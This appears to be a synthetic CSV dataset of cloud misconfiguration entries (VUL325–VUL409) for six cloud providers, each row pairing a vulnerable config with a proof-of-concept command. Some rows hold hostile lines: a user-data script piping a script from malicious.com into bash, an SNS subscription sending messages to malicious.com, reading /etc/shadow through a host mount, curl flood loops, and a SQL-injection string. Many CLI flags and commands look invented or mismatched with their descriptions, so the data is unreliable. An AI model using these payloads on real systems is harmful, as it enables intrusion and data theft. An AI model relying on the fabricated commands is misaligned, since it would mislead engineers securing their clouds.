id,description,category,cloud_provider,vulnerable_code,poc,source,timestamp
VUL325,AWS EKS with misconfigured cluster role bindings allowing privilege escalation.,Privilege Escalation,AWS,"{ ""roleBindings"": [{ ""role"": ""cluster-admin"", ""subjects"": [{ ""kind"": ""User"", ""name"": ""*"" }] }] }",kubectl get clusterrolebindings,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/eks'}",2025-06-19T11:06:00Z
VUL326,Azure API Management with exposed management API allowing configuration tampering.,API Security,Azure,"{ ""managementApi"": { ""publicAccess"": true } }",curl https://api-management.azure-api.net/management,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/api-management'}",2025-06-19T11:06:00Z
VUL327,GCP Cloud SQL with exposed binary logs allowing data exposure.,Data Exposure,GCP,gcloud sql instances create instance --binary-log-public,gcloud sql binary-logs list --instance instance,"{'cve': 'N/A', 'link': 'https://cloud.google.com/sql/docs'}",2025-06-19T11:06:00Z
VUL328,Oracle Cloud Identity with misconfigured federation allowing unauthorized access.,Authentication,Oracle Cloud,"{ ""federation"": { ""trustedIdp"": ""*"" } }",oci iam user login --idp malicious-idp,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Identity/Tasks/managingfederation.htm'}",2025-06-19T11:06:00Z
VUL329,IBM Cloud Functions with misconfigured trigger allowing unauthorized invocation.,Access Control,IBM Cloud,"{ ""trigger"": { ""publicAccess"": true } }",ibmcloud fn trigger fire trigger-name,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:06:00Z
VUL330,Alibaba Cloud OSS with misconfigured replication allowing data exfiltration.,Data Exfiltration,Alibaba Cloud,"{ ""ReplicationConfiguration"": { ""Destination"": ""external-bucket"" } }",aliyun oss ls oss://external-bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:06:00Z
VUL331,AWS CloudTrail with misconfigured SNS topic allowing log tampering.,Monitoring,AWS,"{ ""SnsTopicArn"": ""arn:aws:sns:region:account:public-topic"" }",aws sns publish --topic-arn arn:aws:sns:region:account:public-topic --message 'tamper',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/awscloudtrail'}",2025-06-19T11:06:00Z
VUL332,Azure Synapse Analytics with misconfigured pipeline allowing code execution.,Code Injection,Azure,"{ ""pipeline"": { ""activities"": [{ ""type"": ""ExecuteScript"", ""script"": ""malicious-script"" }] } }",curl https://synapse-workspace.dev.azuresynapse.net/pipelines/run,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/synapse-analytics'}",2025-06-19T11:06:00Z
VUL333,GCP Cloud Build with misconfigured build trigger allowing unauthorized builds.,Access Control,GCP,gcloud builds triggers create manual --repo-name=repo --public,curl https://cloudbuild.googleapis.com/v1/projects/project/triggers/trigger:run,"{'cve': 'N/A', 'link': 'https://cloud.google.com/cloud-build/docs'}",2025-06-19T11:06:00Z
VUL334,Oracle Cloud Compute with misconfigured instance metadata allowing SSRF.,Server-Side Request Forgery,Oracle Cloud,"{ ""metadataOptions"": { ""httpEndpoint"": ""enabled"" } }",curl http://169.254.169.254/opc/v1/instance/ --header 'Host: malicious.com',"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/launchinginstance.htm'}",2025-06-19T11:06:00Z
VUL335,IBM Cloud VPC with misconfigured DNS resolution allowing DNS rebinding attacks.,Network Security,IBM Cloud,"{ ""dnsConfig"": { ""allowRebinding"": true } }",dig @vpc-dns malicious.com,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:06:00Z
VUL336,Alibaba Cloud Function Compute with misconfigured event source allowing unauthorized invocation.,Access Control,Alibaba Cloud,"{ ""eventSource"": { ""publicAccess"": true } }",aliyun fc event invoke --function-name fn,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/52984.htm'}",2025-06-19T11:06:00Z
VUL337,AWS RDS with misconfigured parameter group allowing insecure connections.,Network Security,AWS,"{ ""Parameters"": [{ ""ParameterName"": ""rds.force_ssl"", ""ParameterValue"": ""0"" }] }",mysql -h rds-endpoint -u user -p --ssl-mode=DISABLED,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/rds'}",2025-06-19T11:06:00Z
VUL338,Azure Key Vault with misconfigured access policy allowing secret enumeration.,Data Exposure,Azure,"{ ""accessPolicies"": [{ ""permissions"": { ""secrets"": [""list""] }, ""principalId"": ""*"" }] }",az keyvault secret list --vault-name vault,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/key-vault'}",2025-06-19T11:06:00Z
VUL339,GCP Pub/Sub with misconfigured subscription allowing message interception.,Data Exposure,GCP,gcloud pubsub subscriptions create sub --topic=topic --public,gcloud pubsub subscriptions pull sub,"{'cve': 'N/A', 'link': 'https://cloud.google.com/pubsub/docs'}",2025-06-19T11:06:00Z
VUL340,Oracle Cloud File Storage with misconfigured export allowing unauthorized access.,Access Control,Oracle Cloud,"{ ""exportOptions"": [{ ""source"": ""0.0.0.0/0"" }] }",mount -t nfs fs-endpoint:/export /mnt,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/File/Tasks/managingfilesystems.htm'}",2025-06-19T11:06:00Z
VUL341,IBM Cloud Databases with misconfigured connection string exposing credentials.,Data Exposure,IBM Cloud,"{ ""connectionString"": ""postgresql://user:pass@public-endpoint/db"" }",curl postgresql://user:pass@public-endpoint/db,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/databases'}",2025-06-19T11:06:00Z
VUL342,Alibaba Cloud VPC with misconfigured NAT gateway allowing traffic sniffing.,Network Security,Alibaba Cloud,"{ ""NatGateway"": { ""snatTable"": { ""publicAccess"": true } } }",tcpdump -i eth0 host nat-ip,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/65398.htm'}",2025-06-19T11:06:00Z
VUL343,AWS SQS with misconfigured dead-letter queue exposing sensitive messages.,Data Exposure,AWS,"{ ""RedrivePolicy"": { ""deadLetterTargetArn"": ""arn:aws:sqs:region:account:public-queue"" } }",aws sqs receive-message --queue-url dead-letter-queue-url,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/sqs'}",2025-06-19T11:06:00Z
VUL344,Azure Event Hub with misconfigured consumer group allowing unauthorized access.,Access Control,Azure,"{ ""consumerGroups"": [{ ""name"": ""public-group"", ""access"": ""all"" }] }",curl https://eventhub-namespace.servicebus.windows.net/hub/public-group,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/event-hubs'}",2025-06-19T11:06:00Z
VUL345,GCP BigQuery with misconfigured table ACLs allowing data leakage.,Data Exposure,GCP,"bq update --set_iam_policy '{""bindings"": [{""role"": ""roles/bigquery.dataViewer"", ""members"": [""allUsers""]}]}' dataset.table",bq query 'SELECT * FROM dataset.table',"{'cve': 'N/A', 'link': 'https://cloud.google.com/bigquery/docs'}",2025-06-19T11:06:00Z
VUL346,Oracle Cloud Object Storage with misconfigured pre-authenticated requests allowing unauthorized access.,Access Control,Oracle Cloud,"{ ""preAuthenticatedRequest"": { ""accessType"": ""AnyObjectReadWrite"" } }",curl https://par-url,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Object/Tasks/managingbuckets.htm'}",2025-06-19T11:06:00Z
VUL347,IBM Cloud Kubernetes with misconfigured network policy allowing lateral movement.,Network Security,IBM Cloud,"{ ""networkPolicy"": { ""allowAll"": true } }",kubectl exec pod -- nslookup internal-svc,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:06:00Z
VUL348,Alibaba Cloud ECS with misconfigured auto-scaling policy allowing resource exhaustion.,Denial of Service,Alibaba Cloud,"{ ""AutoScaling"": { ""MaxInstance"": 1000 } }",aliyun ess DescribeScalingActivities,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/25857.htm'}",2025-06-19T11:06:00Z
VUL349,AWS CloudFormation with misconfigured drift detection exposing configuration changes.,Data Exposure,AWS,"{ ""DriftDetection"": { ""enabled"": false } }",aws cloudformation detect-stack-drift --stack-name stack,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/cloudformation'}",2025-06-19T11:06:00Z
VUL350,Azure Machine Learning with misconfigured model deployment allowing inference attacks.,Data Exposure,Azure,"{ ""modelDeployment"": { ""publicInference"": true } }",curl https://ml-workspace.region.api.azureml.ms/score,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/machine-learning'}",2025-06-19T11:06:00Z
VUL351,GCP Cloud Monitoring with misconfigured alert policy allowing silent failures.,Monitoring,GCP,"gcloud monitoring policies create --policy='{""conditions"": []}'",gcloud monitoring policies list,"{'cve': 'N/A', 'link': 'https://cloud.google.com/monitoring/docs'}",2025-06-19T11:06:00Z
VUL352,Oracle Cloud Functions with misconfigured logging exposing sensitive data.,Data Exposure,Oracle Cloud,"{ ""logging"": { ""logLevel"": ""DEBUG"", ""public"": true } }",curl https://fn-endpoint/logs,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Functions/Tasks/functions.htm'}",2025-06-19T11:06:00Z
VUL353,IBM Cloud VPC with misconfigured load balancer allowing traffic interception.,Network Security,IBM Cloud,"{ ""loadBalancer"": { ""publicAccess"": true } }",curl https://lb-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:06:00Z
VUL354,Alibaba Cloud RDS with misconfigured binlog allowing data exposure.,Data Exposure,Alibaba Cloud,"{ ""BinlogAccess"": { ""public"": true } }",curl https://rds-endpoint/binlog,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:06:00Z
VUL355,AWS Redshift with misconfigured snapshot sharing allowing data leakage.,Data Exposure,AWS,"{ ""SnapshotSharing"": { ""publicAccess"": true } }",aws redshift describe-cluster-snapshots --snapshot-identifier snapshot,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/redshift'}",2025-06-19T11:06:00Z
VUL356,Azure Data Lake with misconfigured access control allowing privilege escalation.,Privilege Escalation,Azure,"{ ""accessControl"": { ""permissions"": [""*""], ""principalId"": ""*"" } }",curl https://datalake.dfs.core.windows.net/filesystem/file.txt,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/data-lake-store'}",2025-06-19T11:06:00Z
VUL357,GCP Cloud Composer with misconfigured environment variables exposing secrets.,Data Exposure,GCP,gcloud composer environments create env --env-variables SECRET=plain-text,gcloud composer environments describe env,"{'cve': 'N/A', 'link': 'https://cloud.google.com/composer/docs'}",2025-06-19T11:06:00Z
VUL358,Oracle Cloud VCN with misconfigured security list allowing unauthorized access.,Access Control,Oracle Cloud,"{ ""securityList"": [{ ""source"": ""0.0.0.0/0"", ""protocol"": ""all"" }] }",nmap -p- vcn-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Network/Tasks/managingVCNs.htm'}",2025-06-19T11:06:00Z
VUL359,IBM Cloud Databases with misconfigured backup policy allowing data loss.,Data Protection,IBM Cloud,"{ ""backupPolicy"": { ""retentionDays"": 1 } }",ibmcloud database backups db-id,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/databases'}",2025-06-19T11:06:00Z
VUL360,Alibaba Cloud Function Compute with misconfigured runtime allowing code injection.,Code Injection,Alibaba Cloud,"{ ""runtime"": ""custom"", ""handler"": ""eval(input)"" }","aliyun fc invoke --function-name fn --payload '{""input"": ""malicious-code""}'","{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/52984.htm'}",2025-06-19T11:06:00Z
VUL361,AWS ElastiCache with misconfigured Redis AUTH allowing unauthorized access.,Authentication,AWS,"{ ""AuthToken"": ""weak-token"" }",redis-cli -h elasticache-endpoint -p 6379 -a weak-token,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/elasticache'}",2025-06-19T11:06:00Z
VUL362,Azure Databricks with misconfigured workspace allowing data exfiltration.,Data Exfiltration,Azure,"{ ""workspaceAccess"": { ""public"": true } }",curl https://databricks-workspace.azuredatabricks.net/api/2.0/workspace/export,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/databricks'}",2025-06-19T11:06:00Z
VUL363,GCP Cloud VPN with misconfigured routing allowing traffic interception.,Network Security,GCP,gcloud compute routes create route --destination-range=0.0.0.0/0 --next-hop-vpn-tunnel=tunnel,tcpdump -i eth0 host vpn-ip,"{'cve': 'N/A', 'link': 'https://cloud.google.com/vpn/docs'}",2025-06-19T11:06:00Z
VUL364,Oracle Cloud File Storage with misconfigured mount target allowing unauthorized access.,Access Control,Oracle Cloud,"{ ""mountTarget"": { ""source"": ""0.0.0.0/0"" } }",mount -t nfs fs-endpoint:/mount /mnt,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/File/Tasks/managingfilesystems.htm'}",2025-06-19T11:06:00Z
VUL365,IBM Cloud Kubernetes with misconfigured RBAC allowing privilege escalation.,Privilege Escalation,IBM Cloud,"{ ""roleBindings"": [{ ""role"": ""cluster-admin"", ""subjects"": [""*""] }] }",kubectl get clusterrolebindings,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:06:00Z
VUL366,Alibaba Cloud OSS with misconfigured bucket policy allowing data tampering.,Data Exposure,Alibaba Cloud,"{ ""BucketPolicy"": { ""Statement"": [{ ""Action"": ""oss:PutObject"", ""Principal"": ""*"" }] } }",aliyun oss cp malicious.txt oss://bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:06:00Z
VUL367,AWS CodeBuild with misconfigured environment variables exposing secrets.,Data Exposure,AWS,"{ ""environmentVariables"": [{ ""name"": ""API_KEY"", ""value"": ""plain-text-key"" }] }",aws codebuild batch-get-builds --ids build-id,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/codebuild'}",2025-06-19T11:06:00Z
VUL368,Azure Cognitive Services with misconfigured API key rotation exposing keys.,Data Exposure,Azure,"{ ""keyRotationPolicy"": { ""enabled"": false } }",curl -H 'Ocp-Apim-Subscription-Key: old-key' https://cognitive-endpoint/api,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/cognitive-services'}",2025-06-19T11:06:00Z
VUL369,GCP Cloud Spanner with misconfigured audit logs allowing undetected access.,Monitoring,GCP,gcloud spanner databases create db --instance=instance --audit-logging=false,gcloud spanner databases describe db --instance=instance,"{'cve': 'N/A', 'link': 'https://cloud.google.com/spanner/docs'}",2025-06-19T11:06:00Z
VUL370,Oracle Cloud API Gateway with misconfigured throttling allowing DoS attacks.,Denial of Service,Oracle Cloud,"{ ""throttlingPolicy"": { ""requestsPerSecond"": 10000 } }",for i in {1..10000}; do curl https://api-gateway-endpoint; done,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/APIGateway/Tasks/apigateway.htm'}",2025-06-19T11:06:00Z
VUL371,IBM Cloud Security Group with misconfigured rules allowing lateral movement.,Network Security,IBM Cloud,"{ ""rules"": [{ ""source"": ""10.0.0.0/8"", ""protocol"": ""all"" }] }",nmap -p- internal-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:06:00Z
VUL372,Alibaba Cloud ECS with misconfigured snapshot export allowing data leakage.,Data Exposure,Alibaba Cloud,"{ ""SnapshotExport"": { ""publicAccess"": true } }",aliyun ecs ExportSnapshot --SnapshotId snapshot-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/25535.htm'}",2025-06-19T11:06:00Z
VUL373,AWS S3 bucket with misconfigured encryption rules exposing data.,Encryption,AWS,"{ ""ServerSideEncryptionConfiguration"": { ""Rules"": [] } }",aws s3api get-bucket-encryption --bucket bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/s3'}",2025-06-19T11:06:00Z
VUL374,Azure Stream Analytics with misconfigured input allowing data injection.,Injection,Azure,"{ ""input"": { ""type"": ""Stream"", ""source"": ""untrusted-source"" } }",curl https://stream-analytics-job.region.streamanalytics.azure.net/input,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/stream-analytics'}",2025-06-19T11:06:00Z
VUL375,GCP Cloud Armor with misconfigured rules allowing SQL injection.,Injection,GCP,gcloud compute security-policies create policy --no-sql-injection-protection,curl https://backend-service-ip?input=' OR 1=1 --,"{'cve': 'N/A', 'link': 'https://cloud.google.com/armor/docs'}",2025-06-19T11:06:00Z
VUL376,Oracle Cloud VCN with misconfigured NAT gateway allowing traffic sniffing.,Network Security,Oracle Cloud,"{ ""natGateway"": { ""publicAccess"": true } }",tcpdump -i eth0 host nat-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Network/Tasks/managingVCNs.htm'}",2025-06-19T11:06:00Z
VUL377,IBM Cloud Kubernetes with misconfigured pod security context allowing privilege escalation.,Privilege Escalation,IBM Cloud,"{ ""securityContext"": { ""privileged"": true } }",kubectl exec pod -- whoami,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:06:00Z
VUL378,Alibaba Cloud OSS with misconfigured versioning allowing data tampering.,Data Protection,Alibaba Cloud,"{ ""VersioningConfiguration"": { ""Status"": ""Suspended"" } }",aliyun oss cp malicious.txt oss://bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:06:00Z
VUL379,AWS Fargate with misconfigured network configuration allowing lateral movement.,Network Security,AWS,"{ ""networkConfiguration"": { ""assignPublicIp"": ""ENABLED"" } }",nmap -p- fargate-ip,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/ecs'}",2025-06-19T11:06:00Z
VUL380,Azure API Management with misconfigured gateway allowing request smuggling.,API Security,Azure,"{ ""gatewayConfig"": { ""httpValidation"": false } }",curl -H 'Transfer-Encoding: chunked' https://api-management.azure-api.net,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/api-management'}",2025-06-19T11:06:00Z
VUL381,GCP Cloud DNS with misconfigured zone transfer allowing DNS data exposure.,Data Exposure,GCP,gcloud dns managed-zones create zone --allow-zone-transfer,dig @dns-ip AXFR zone,"{'cve': 'N/A', 'link': 'https://cloud.google.com/dns/docs'}",2025-06-19T11:06:00Z
VUL382,Oracle Cloud Identity with misconfigured API key allowing unauthorized access.,Authentication,Oracle Cloud,"{ ""apiKey"": { ""publicAccess"": true } }",oci iam user api-key list --user-id user-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Identity/Tasks/managingusers.htm'}",2025-06-19T11:06:00Z
VUL383,IBM Cloud VPC with misconfigured endpoint service allowing unauthorized access.,Access Control,IBM Cloud,"{ ""endpointService"": { ""publicAccess"": true } }",curl https://endpoint-service-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:06:00Z
VUL384,Alibaba Cloud RDS with misconfigured replication allowing data exposure.,Data Exposure,Alibaba Cloud,"{ ""ReplicationConfig"": { ""publicAccess"": true } }",mysql -h replica-endpoint -u user -p,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:06:00Z
VUL385,AWS SNS with misconfigured topic subscription allowing message interception.,Data Exposure,AWS,"{ ""Subscription"": { ""Endpoint"": ""public-endpoint"" } }",aws sns subscribe --topic-arn arn:aws:sns:region:account:topic --protocol http --notification-endpoint http://malicious.com,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/sns'}",2025-06-19T11:06:00Z
VUL386,Azure Virtual Network with misconfigured peering allowing lateral movement.,Network Security,Azure,"{ ""virtualNetworkPeering"": { ""allowForwardedTraffic"": true } }",nmap -p- peered-vnet-ip,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-network'}",2025-06-19T11:06:00Z
VUL387,GCP Cloud SQL with misconfigured failover allowing unauthorized access.,Access Control,GCP,gcloud sql instances create instance --failover-replica-name=public-replica,mysql -h failover-replica-ip -u user -p,"{'cve': 'N/A', 'link': 'https://cloud.google.com/sql/docs'}",2025-06-19T11:06:00Z
VUL388,Oracle Cloud File Storage with misconfigured NFS export allowing data leakage.,Data Exposure,Oracle Cloud,"{ ""nfsExportOptions"": [{ ""source"": ""0.0.0.0/0"", ""access"": ""readWrite"" }] }",mount -t nfs fs-endpoint:/export /mnt,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/File/Tasks/managingfilesystems.htm'}",2025-06-19T11:06:00Z
VUL389,IBM Cloud Databases with misconfigured audit policy allowing undetected access.,Monitoring,IBM Cloud,"{ ""auditPolicy"": { ""enabled"": false } }",ibmcloud database audit db-id,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/databases'}",2025-06-19T11:06:00Z
VUL390,Alibaba Cloud ECS with misconfigured instance role allowing privilege escalation.,Privilege Escalation,Alibaba Cloud,"{ ""InstanceRole"": { ""permissions"": ""*"" } }",aliyun ecs DescribeInstanceAttribute --InstanceId instance-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/59643.htm'}",2025-06-19T11:06:00Z
VUL391,AWS Lambda with misconfigured VPC endpoint allowing traffic interception.,Network Security,AWS,"{ ""VpcConfig"": { ""securityGroupIds"": [], ""subnetIds"": [] } }",tcpdump -i eth0 host vpc-endpoint-ip,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/lambda'}",2025-06-19T11:06:00Z
VUL392,Azure Kubernetes with misconfigured service account allowing cluster compromise.,Privilege Escalation,Azure,"{ ""serviceAccount"": { ""permissions"": ""cluster-admin"" } }",kubectl get secrets --all-namespaces,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/aks'}",2025-06-19T11:06:00Z
VUL393,GCP Cloud Run with misconfigured IAM policy allowing unauthorized invocation.,Access Control,GCP,gcloud run services add-iam-policy-binding service --member='allUsers' --role='roles/run.invoker',curl https://service-region.run.app,"{'cve': 'N/A', 'link': 'https://cloud.google.com/run/docs'}",2025-06-19T11:06:00Z
VUL394,Oracle Cloud Load Balancer with misconfigured listener allowing request smuggling.,API Security,Oracle Cloud,"{ ""listener"": { ""httpValidation"": false } }",curl -H 'Transfer-Encoding: chunked' https://lb-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Balance/Tasks/managingloadbalancers.htm'}",2025-06-19T11:06:00Z
VUL395,IBM Cloud Functions with misconfigured logging exposing sensitive data.,Data Exposure,IBM Cloud,"{ ""logging"": { ""logLevel"": ""DEBUG"", ""public"": true } }",curl https://fn-endpoint/logs,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:06:00Z
VUL396,Alibaba Cloud OSS with misconfigured event notification allowing data exfiltration.,Data Exfiltration,Alibaba Cloud,"{ ""EventNotification"": { ""destination"": ""external-service"" } }",aliyun oss ls oss://external-bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:06:00Z
VUL397,AWS API Gateway with misconfigured caching allowing data leakage.,Data Exposure,AWS,"{ ""cacheClusterEnabled"": true, ""cacheDataEncrypted"": false }",curl https://api-id.execute-api.region.amazonaws.com/stage/cache,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/apigateway'}",2025-06-19T11:06:00Z
VUL398,Azure App Service with misconfigured custom domain allowing subdomain takeover.,Domain Hijacking,Azure,"{ ""customDomain"": { ""unverified"": true } }",dig custom-domain.azurewebsites.net,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/app-service'}",2025-06-19T11:06:00Z
VUL399,GCP Cloud Storage with misconfigured CORS allowing cross-origin data exfiltration.,Data Exfiltration,GCP,"gsutil cors set cors-config.json gs://bucket; cors-config.json: [{""origin"": [""*""], ""method"": [""GET"", ""PUT""]}]",curl -H 'Origin: http://malicious.com' https://storage.googleapis.com/bucket/file.txt,"{'cve': 'N/A', 'link': 'https://cloud.google.com/storage/docs'}",2025-06-19T11:06:00Z
VUL400,Oracle Cloud Database with misconfigured audit trail allowing undetected access.,Monitoring,Oracle Cloud,"{ ""auditTrail"": { ""publicAccess"": true } }",curl https://db-endpoint/audit-trail,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Database/Tasks/auditing.htm'}",2025-06-19T11:06:00Z
VUL401,AWS ECS with misconfigured task definition allowing container breakout.,Privilege Escalation,AWS,"{ ""containerDefinitions"": [{ ""privileged"": true, ""mountPoints"": [{ ""sourceVolume"": ""host"", ""containerPath"": ""/host"" }] }] }",docker exec container-id /bin/sh -c 'cat /host/etc/shadow',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/ecs'}",2025-06-19T11:12:00Z
VUL402,Azure Function with misconfigured trigger allowing unauthorized invocation.,Access Control,Azure,"{ ""bindings"": [{ ""type"": ""httpTrigger"", ""authLevel"": ""anonymous"" }] }",curl https://function-app.azurewebsites.net/api/function,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/azure-functions'}",2025-06-19T11:12:00Z
VUL403,GCP Cloud Run with misconfigured concurrency allowing resource exhaustion.,Denial of Service,GCP,gcloud run deploy service --image image --concurrency 1000,for i in {1..1000}; do curl https://service-region.run.app & done,"{'cve': 'N/A', 'link': 'https://cloud.google.com/run/docs'}",2025-06-19T11:12:00Z
VUL404,Oracle Cloud Compute with misconfigured user data allowing code injection.,Code Injection,Oracle Cloud,"{ ""userData"": ""#!/bin/bash
curl http://malicious.com/script.sh | bash"" }",oci compute instance-action --instance-id instance-id --action START,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/launchinginstance.htm'}",2025-06-19T11:12:00Z
VUL405,IBM Cloud Object Storage with misconfigured CORS exposing data to unauthorized origins.,Data Exfiltration,IBM Cloud,"{ ""corsConfiguration"": { ""allowedOrigins"": [""*""], ""allowedMethods"": [""GET"", ""PUT""] } }",curl -H 'Origin: http://malicious.com' https://s3.bucket/file.txt,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/cloud-object-storage'}",2025-06-19T11:12:00Z
VUL406,Alibaba Cloud SLB with misconfigured health check allowing DoS attacks.,Denial of Service,Alibaba Cloud,"{ ""HealthCheck"": { ""interval"": 1, ""timeout"": 1 } }",for i in {1..1000}; do curl https://slb-ip; done,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/27595.htm'}",2025-06-19T11:12:00Z
VUL407,AWS S3 bucket with misconfigured replication allowing data exfiltration.,Data Exfiltration,AWS,"{ ""ReplicationConfiguration"": { ""Rules"": [{ ""Destination"": { ""Bucket"": ""arn:aws:s3:::external-bucket"" } }] } }",aws s3 ls s3://external-bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/s3'}",2025-06-19T11:12:00Z
VUL408,Azure SQL Database with misconfigured firewall allowing unauthorized access.,Access Control,Azure,"{ ""firewallRules"": [{ ""startIpAddress"": ""0.0.0.0"", ""endIpAddress"": ""255.255.255.255"" }] }",sqlcmd -S sql-server.database.windows.net -U user -P pass,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/azure-sql'}",2025-06-19T11:12:00Z
VUL409,GCP Cloud Functions with misconfigured HTTP trigger allowing unauthorized invocation.,Access Control,GCP,gcloud functions deploy fn --trigger-http --allow-unauthenticated,curl https://us-central1-project.cloudfunctions.net/fn,"{'cve': 'N/A', 'link': 'https://cloud.google.com/functions/docs'}",2025-06-19T11:12:00Z
